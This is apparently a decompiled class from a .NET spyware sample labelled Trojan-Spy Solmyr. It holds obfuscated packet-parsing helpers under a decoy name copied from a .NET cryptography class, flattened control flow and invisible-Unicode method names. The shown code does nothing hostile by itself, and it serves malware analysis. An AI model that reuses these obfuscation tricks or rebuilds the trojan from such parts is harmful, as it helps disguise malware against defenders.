// Decompiled with JetBrains decompiler
// Type: AllMembershipCondition.RijndaelManaged
// Assembly: HStringMarshaler, Version=48.18.3.2, Culture=neutral, PublicKeyToken=null
// MVID: C9C3DCB9-2BA4-424F-9339-2594708EFA64
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Spy.MSIL.Solmyr.gen-61b469d1f7dd980add5fef67a976c5ede46680ae91ab253e216d5e99d2b91992.exe

using System;
using System.Runtime.InteropServices;
using System.Text;

namespace AllMembershipCondition
{
  public class RijndaelManaged
  {
    internal int bytesParsed;

    public RijndaelManaged()
    {
label_1:
      int num1 = -452167354;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -897531482)) % 3U)
        {
          case 1:
            this.requestedKey = new byte[0];
            num1 = (int) num2 * -1132055243 ^ -1942991185;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      this.bytesParsed = 0;
    }

    public byte PacketId { get; set; }

    public string GameName { get; set; }

    public byte[] data { get; set; }

    public byte[] requestedKey { get; set; }

    internal string FetchString(byte[] buffer)
    {
label_1:
      int num1 = 1196049667;
      int num2;
      byte[] numArray;
      string str;
      while (true)
      {
        uint num3;
        switch ((num3 = (uint) (num1 ^ 1657395250)) % 7U)
        {
          case 0:
            this.bytesParsed = checked (num2 + 1);
            num1 = (int) num3 * 788659773 ^ 373745693;
            continue;
          case 1:
            str = RijndaelManaged.\u200D⁮‍⁮⁪⁭‮‎⁪⁮⁭⁪⁮‫‭‏‍⁬⁪‬⁬‍‍‏⁮⁮‏⁬‭‮⁬⁫‫⁪⁯⁫‍​‏⁪‮(RijndaelManaged.\u206B‬⁪⁪‪​⁬‍‪⁫⁪⁭⁪‌⁫⁪‌‍⁯‌⁫‎‌⁫‬​⁪‫⁭‌⁫⁮⁪‬‫‏⁯⁫⁪‮(), numArray);
            num1 = (int) num3 * 847156354 ^ -527319729;
            continue;
          case 2:
            num1 = (int) num3 * 980926918 ^ -153452159;
            continue;
          case 3:
            num2 = Array.IndexOf<byte>(buffer, (byte) 0, this.bytesParsed);
            numArray = new byte[checked (num2 - this.bytesParsed - 1 + 1)];
            num1 = (int) num3 * 1727614836 ^ 804251936;
            continue;
          case 5:
            RijndaelManaged.\u200C‭‫⁮⁫‭‬‎‎‬‪‎‭⁬‮‫‭‌⁭‍⁬‎⁯‎⁪⁪⁭⁫‬⁫‭⁭​⁪‏⁯⁪‍‭‪‮((Array) buffer, this.bytesParsed, (Array) numArray, 0, numArray.Length);
            num1 = (int) num3 * -2047663238 ^ 1777854081;
            continue;
          case 6:
            goto label_1;
          default:
            goto label_8;
        }
      }
label_8:
      return str;
    }

    internal void ConcatArray(byte[] source, ref byte[] dest, byte separator = 255)
    {
label_1:
      int num1 = -1342847883;
      int newSize;
      bool flag1;
      int length;
      bool flag2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1277282645)) % 13U)
        {
          case 0:
            RijndaelManaged.\u200C‭‫⁮⁫‭‬‎‎‬‪‎‭⁬‮‫‭‌⁭‍⁬‎⁯‎⁪⁪⁭⁫‬⁫‭⁭​⁪‏⁯⁪‍‭‪‮((Array) source, 0, (Array) dest, length, source.Length);
            num1 = (int) num2 * -1641338288 ^ 1252909946;
            continue;
          case 1:
            length = dest.Length;
            num1 = (int) num2 * 1862091675 ^ 256840691;
            continue;
          case 2:
            checked { ++newSize; }
            num1 = (int) num2 * 316722972 ^ 148778442;
            continue;
          case 3:
            dest[checked (dest.Length - 1)] = separator;
            num1 = (int) num2 * 1033471816 ^ 1169926647;
            continue;
          case 4:
            flag2 = separator != byte.MaxValue;
            num1 = (int) num2 * -321148293 ^ -1543043265;
            continue;
          case 5:
            Array.Resize<byte>(ref dest, newSize);
            num1 = -769174903;
            continue;
          case 6:
            goto label_3;
          case 7:
            goto label_1;
          case 8:
            int num3 = flag2 ? -343745674 : (num3 = -1289898599);
            num1 = num3 ^ (int) num2 * -1866269239;
            continue;
          case 9:
            newSize = checked (dest.Length + source.Length);
            num1 = (int) num2 * -1445033536 ^ 462859900;
            continue;
          case 10:
            num1 = (int) num2 * 1053204555 ^ -309817123;
            continue;
          case 11:
            int num4 = !flag1 ? 301006178 : (num4 = 164392226);
            num1 = num4 ^ (int) num2 * -1032271859;
            continue;
          case 12:
            flag1 = separator != byte.MaxValue;
            num1 = (int) num2 * -1544694248 ^ -784121542;
            continue;
          default:
            goto label_15;
        }
      }
label_3:
      return;
label_15:;
    }

    internal byte[] GetBytes(string str)
    {
label_1:
      int num1 = -444906578;
      byte[] bytes;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1549905404)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * 1915866411 ^ -281515760;
            continue;
          case 2:
            bytes = RijndaelManaged.\u206D⁮‭⁯‭‮‫⁮‫⁮⁬‬‫‏‬⁫‬‬⁫‍‍‪‪​⁯‮⁯‎​⁭⁬⁭‏‪‮‬‌⁮⁫‮(RijndaelManaged.\u206B‬⁪⁪‪​⁬‍‪⁫⁪⁭⁪‌⁫⁪‌‍⁯‌⁫‎‌⁫‬​⁪‫⁭‌⁫⁮⁪‬‫‏⁯⁫⁪‮(), str);
            num1 = (int) num2 * -1337082657 ^ -827775945;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return bytes;
    }

    internal string GetString(byte[] bytes)
    {
label_1:
      int num1 = 472970770;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1972645558)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            str = RijndaelManaged.\u200D⁮‍⁮⁪⁭‮‎⁪⁮⁭⁪⁮‫‭‏‍⁬⁪‬⁬‍‍‏⁮⁮‏⁬‭‮⁬⁫‫⁪⁯⁫‍​‏⁪‮(RijndaelManaged.\u206B‬⁪⁪‪​⁬‍‪⁫⁪⁭⁪‌⁫⁪‌‍⁯‌⁫‎‌⁫‬​⁪‫⁭‌⁫⁮⁪‬‫‏⁯⁫⁪‮(), bytes);
            num1 = (int) num2 * -1174135593 ^ 561346810;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return str;
    }

    internal byte[] BuildInvertetUInt16Array(ushort value)
    {
label_1:
      int num1 = -1374094310;
      byte[] numArray1;
      byte[] numArray2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1456407254)) % 5U)
        {
          case 0:
            num1 = (int) num2 * -1673583413 ^ -920302433;
            continue;
          case 1:
            numArray1 = RijndaelManaged.\u206C‭‪‎⁭⁯‭​‫⁮⁬‌‮⁭⁫‎​‮⁯‍‮​‪‮‏⁭‍⁪⁯‬‭‎⁭‫⁫‍‎‬​‌‮(value);
            RijndaelManaged.\u202A⁯‫‎⁭⁭‏‬‍‪⁬⁪⁫‌‮‭‏⁭⁬⁮‬‮‌⁪‍‪‭‎‮‏⁭⁯⁫⁮‬‍⁮⁭​‍‮((Array) numArray1);
            num1 = (int) num2 * 1150573497 ^ 828242646;
            continue;
          case 3:
            goto label_1;
          case 4:
            numArray2 = numArray1;
            num1 = (int) num2 * -169728195 ^ -561110127;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      return numArray2;
    }

    internal byte[] FetchKey(byte[] data)
    {
      byte[] numArray1 = new byte[8];
label_1:
      int num1 = 514810211;
      byte[] numArray2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 807616618)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            // ISSUE: variable of a reference type
            int& local;
            // ISSUE: explicit reference operation
            int num3 = checked (^(local = ref this.bytesParsed) + 8);
            local = num3;
            numArray2 = numArray1;
            num1 = (int) num2 * -1197462992 ^ -996725467;
            continue;
          case 2:
            num1 = (int) num2 * -1493679596 ^ -1790110008;
            continue;
          case 3:
            RijndaelManaged.\u200C‭‫⁮⁫‭‬‎‎‬‪‎‭⁬‮‫‭‌⁭‍⁬‎⁯‎⁪⁪⁭⁫‬⁫‭⁭​⁪‏⁯⁪‍‭‪‮((Array) data, this.bytesParsed, (Array) numArray1, 0, numArray1.Length);
            num1 = (int) num2 * -894381017 ^ -1924268486;
            continue;
          default:
            goto label_6;
        }
      }
label_6:
      return numArray2;
    }

    public virtual byte[] CompileResponse()
    {
label_1:
      int num1 = -502452224;
      byte[] numArray;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1576683280)) % 3U)
        {
          case 1:
            numArray = new byte[0];
            num1 = (int) num2 * 1188767315 ^ 1451299737;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return numArray;
    }

    public virtual void ManageData()
    {
label_1:
      int num1 = -1107543247;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -598181006)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            goto label_3;
          case 2:
            num1 = (int) num2 * -1012243291 ^ 973788402;
            continue;
          default:
            goto label_5;
        }
      }
label_3:
      return;
label_5:;
    }

    static void \u200C‭‫⁮⁫‭‬‎‎‬‪‎‭⁬‮‫‭‌⁭‍⁬‎⁯‎⁪⁪⁭⁫‬⁫‭⁭​⁪‏⁯⁪‍‭‪‮(
      [In] Array obj0,
      [In] int obj1,
      [In] Array obj2,
      [In] int obj3,
      [In] int obj4)
    {
      Array.Copy(obj0, obj1, obj2, obj3, obj4);
    }

    static Encoding \u206B‬⁪⁪‪​⁬‍‪⁫⁪⁭⁪‌⁫⁪‌‍⁯‌⁫‎‌⁫‬​⁪‫⁭‌⁫⁮⁪‬‫‏⁯⁫⁪‮() => Encoding.ASCII;

    static string \u200D⁮‍⁮⁪⁭‮‎⁪⁮⁭⁪⁮‫‭‏‍⁬⁪‬⁬‍‍‏⁮⁮‏⁬‭‮⁬⁫‫⁪⁯⁫‍​‏⁪‮([In] Encoding obj0, [In] byte[] obj1) => obj0.GetString(obj1);

    static byte[] \u206D⁮‭⁯‭‮‫⁮‫⁮⁬‬‫‏‬⁫‬‬⁫‍‍‪‪​⁯‮⁯‎​⁭⁬⁭‏‪‮‬‌⁮⁫‮([In] Encoding obj0, [In] string obj1) => obj0.GetBytes(obj1);

    static byte[] \u206C‭‪‎⁭⁯‭​‫⁮⁬‌‮⁭⁫‎​‮⁯‍‮​‪‮‏⁭‍⁪⁯‬‭‎⁭‫⁫‍‎‬​‌‮([In] ushort obj0) => BitConverter.GetBytes(obj0);

    static void \u202A⁯‫‎⁭⁭‏‬‍‪⁬⁪⁫‌‮‭‏⁭⁬⁮‬‮‌⁪‍‪‭‎‮‏⁭⁯⁫⁮‬‍⁮⁭​‍‮([In] Array obj0) => Array.Reverse(obj0);
  }
}
